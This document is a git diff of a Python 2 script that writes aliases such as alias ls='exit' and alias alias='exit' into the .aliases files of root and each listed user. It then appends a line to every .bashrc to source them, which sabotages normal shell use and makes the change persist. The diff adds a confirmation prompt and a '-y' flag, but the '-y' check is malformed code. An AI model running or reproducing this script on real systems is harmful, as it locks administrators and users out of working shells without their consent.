@@ -2,6 +2,7 @@
 
 import subprocess
 import os
+import sys
 
 users = []
 
@@ -19,9 +20,24 @@ def appendAliases(aliasesfolder):
 		myfile.write("alias ls='exit'\n")
 		myfile.write("alias alias='exit'\n")
 
-appendAliases("/root/.aliases")
-os.system("echo source /root/.aliases >> /root/.bashrc")
 
-for user in users:
-	appendAliases("/home/" + user + "/.aliases")
-	os.system("echo source " + "/home/" + user + "/.aliases >> /home/" + user + "/.bashrc")
+if len(sys.argv) == 1:
+	userinput = raw_input("You sure?")
+	if userinput == 'yes':
+		appendAliases("/root/.aliases")
+		os.system("echo source /root/.aliases >> /root/.bashrc")
+		
+		for user in users:
+			appendAliases("/home/" + user + "/.aliases")
+			os.system("echo source " + "/home/" + user + "/.aliases >> /home/" + user + "/.bashrc")
+	else:
+		print "That's a no."
+elif len(sys.argv == 2 and sys.argv[1] == '-y'):
+		appendAliases("/root/.aliases")
+		os.system("echo source /root/.aliases >> /root/.bashrc")
+		
+		for user in users:
+			appendAliases("/home/" + user + "/.aliases")
+			os.system("echo source " + "/home/" + user + "/.aliases >> /home/" + user + "/.bashrc")
+else:
+	print "Saving youself"
